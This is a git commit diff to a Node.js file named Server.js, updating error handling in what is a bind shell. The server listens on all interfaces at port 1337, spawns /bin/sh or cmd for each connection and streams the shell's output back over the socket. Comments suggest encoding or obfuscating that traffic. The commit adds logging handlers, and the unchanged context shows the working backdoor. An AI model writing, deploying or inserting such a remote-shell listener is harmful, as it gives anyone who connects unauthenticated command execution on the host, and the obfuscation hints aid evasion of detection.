6abcfa2d79fb6d8e3c43dfb229a025a57cf78e91
Miftachul Huda <miftachulcc@gmail.com>
2022-07-26 21:56:40 +0700

    Update error handliing

--- Server.js
+++ Server.js
@@ -6,11 +6,11 @@ var server = net.createServer(function (socket) {
   var sh = (process.platform === 'win32') ? spawn('cmd') : spawn('/bin/sh')
   sh.stdin.resume()
   sh.stdout.on('data', function (data) {
-                // Node makes async stuff easy.
-                // You can do cool things like:
-                // socket.write(Base64_encode(data));
-                // or any other encoding/obfuscation
-                // for that matter.
+    // Node makes async stuff easy.
+    // You can do cool things like:
+    // socket.write(Base64_encode(data));
+    // or any other encoding/obfuscation
+    // for that matter.
     socket.write(data)
   })
   sh.stderr.on('data', function (data) {
@@ -27,6 +27,12 @@ var server = net.createServer(function (socket) {
   })
   socket.on('close', function (hadError) {
     console.log('Connection closed', hadError ? 'because of a conn. error' : 'by client')
+  })
+  socket.on('error', function (x) {
+    console.log(`err:${x}`)
+  })
+  socket.on('drain', function (x) {
+    console.log(`drain:${x}`)
   })
 })
 server.listen(1337, '0.0.0.0')
